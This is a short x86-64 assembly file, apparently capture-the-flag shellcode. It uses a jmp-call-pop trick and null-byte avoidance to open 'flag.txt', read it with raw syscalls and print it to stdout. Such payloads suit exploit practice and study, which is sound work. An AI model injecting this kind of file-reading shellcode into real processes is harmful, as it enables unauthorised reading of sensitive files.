global _start

section .text
jmp _push_filename

_readfile:
    ; open the file
    pop rdi
    xor byte [rdi+9], 0x41

    xor rax, rax
    add al, 2
    xor rsi, rsi
    syscall

    ;readfile
    sub sp, 0xfff
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0x100
    xor rax, rax
    syscall

    ;write to stdout
    xor rdi, rdi
    add dil, 1
    mov rdx, rax
    xor rax, rax
    add al, 1
    syscall

    ;epic exit
    xor rax, rax
    add al, 60
    syscall

_push_filename:
call _readfile
path: db "flag.txtA"
